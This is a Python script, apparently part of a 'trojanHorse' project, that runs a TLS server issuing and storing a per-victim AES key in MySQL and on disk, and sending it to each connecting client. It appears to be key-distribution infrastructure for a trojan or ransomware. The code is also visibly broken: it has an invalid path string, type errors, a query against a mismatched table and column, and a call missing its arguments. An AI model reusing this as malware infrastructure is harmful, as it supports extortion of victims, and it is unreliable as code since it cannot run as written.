import socket
import ssl
import random
import mysql.connector
import sqlite3
import os
import time
def client_connection():
    context = ssl.create_default_context()
    context.load_cert_chain(certfile="server.crt", keyfile="server.key")
    server = socket.socket()
    secure_server = context.wrap_socket(server, server_side= True)
    secure_server.bind(("0.0.0.0", 9999))
    secure_server.listen(1)
    print("Waiting for connection...")
    conn, addr = secure_server.accept()
    print("Connected from: ", addr)
    secret_key = create_secret_key(addr)
    print("The randomly generated secret key is: " + secret_key)
    store_key_in_DB(addr, secret_key)
    conn.sendall(secret_key.encode())

def create_secret_key(client_ip):
    random_key = os.urandom(32) # 32 bytes for aes key length
    with open("C:\Users\avico\source\repos\Cyber\trojanHorse\keys\{}" .format(client_ip), "wb") as key_file:
        key_file.write(random_key)
    store_key_in_DB(client_ip, random_key)
    return random_key

def connect_to_server(user, password):
    return mysql.connector.connect(
        host="localhost",
        user=user,
        password=password
    )
def create_database(mydb):
    mycursor = mydb.cursor()
    mycursor.execute("CREATE DATABASE IF NOT EXISTS mydatabase")
    mycursor.execute("USE mydatabase")
    mycursor.close()

def create_table(mydb):
    mycursor = mydb.cursor()
    mycursor.execute("""
        CREATE TABLE IF NOT EXISTS keys (
        addr VARCHAR(45) PRIMARY KEY,
        aes_key BLOB
        )
    """)
    mycursor.close()

def insert_key(mydb, addr, key):
    mycursor = mydb.cursor()
    sql = "INSERT INTO keys (addr, aes_key) VALUES (%s, %s)"
    mycursor.execute(sql, (addr, key))
    mydb.commit()
    mycursor.close()
    
def get_key(mydb, addr):
    mycursor = mydb.cursor()
    sql = "SELECT aes_key From customers WHERE adrr = %s"
    mycursor.execute(sql, (str(addr)))
    result = mycursor.fetchall()
    mycursor.close()
    return result

def store_key_in_DB(adrr,key):
    username = "root"
    password = input("Enter the mysql password: ")
    mydb = connect_to_server(username, password)
    create_database(mydb)
    create_table(mydb)
    insert_key(mydb, adrr, key)

if __name__ == "__main__":
    client_connection()
    secret_key = get_key()
    
